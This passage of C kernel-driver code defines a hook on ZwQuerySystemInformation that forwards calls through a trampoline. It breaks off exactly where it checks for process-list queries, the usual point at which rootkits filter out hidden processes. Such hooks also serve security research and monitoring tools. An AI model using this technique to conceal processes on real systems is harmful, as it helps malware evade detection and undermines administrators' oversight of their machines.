NTSTATUS NTAPI HookedZwQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
)
{
    NTSTATUS status = STATUS_SUCCESS;
    
    // [FIX] Use the trampoline pointer to call original function
    // This avoids infinite recursion
    PFN_ZW_QUERY_SYSTEM_INFORMATION original = (PFN_ZW_QUERY_SYSTEM_INFORMATION)g_OriginalZwQuerySystemInformation;

    if (!original) {
        return STATUS_UNSUCCESSFUL;
    }

    __try
    {
        status = original(
            SystemInformationClass,
            SystemInformation,
            SystemInformationLength,
            ReturnLength
        );
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        return STATUS_UNSUCCESSFUL;
    }

    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation && SystemInformation)
